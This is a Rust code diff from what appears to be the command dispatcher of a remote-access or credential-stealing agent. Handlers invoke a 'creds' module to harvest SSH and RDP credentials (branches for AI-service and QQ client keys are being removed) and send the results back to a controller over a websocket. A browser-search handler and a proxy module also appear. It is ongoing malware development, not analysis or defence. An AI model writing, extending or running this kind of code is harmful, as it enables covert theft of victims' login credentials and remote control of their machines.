@@ -255,12 +255,6 @@ impl AgentEngine {
                 })).await;
                 ws_send(tx, &agent_id, "othersoft.browser.search.result", &r, rid).await;
             }
-            ws_type::OTHERSOFT_AI => {
-                let r = run_module(module_manager, "creds", serde_json::json!({
-                    "op": "ai"
-                })).await;
-                ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
-            }
             ws_type::OTHERSOFT_SSH => {
                 let r = run_module(module_manager, "creds", serde_json::json!({
                     "op": "ssh"
@@ -272,12 +266,6 @@ impl AgentEngine {
                     "op": "rdp"
                 })).await;
                 ws_send(tx, &agent_id, "othersoft.rdp.result", &r, rid).await;
-            }
-            ws_type::OTHERSOFT_QQ_CLIENTKEY => {
-                let r = run_module(module_manager, "creds", serde_json::json!({
-                    "op": "qq_clientkey"
-                })).await;
-                ws_send(tx, &agent_id, "othersoft.qq_clientkey.result", &r, rid).await;
             }
 
             // ── Proxy (cloud module) ─────────────────────────────
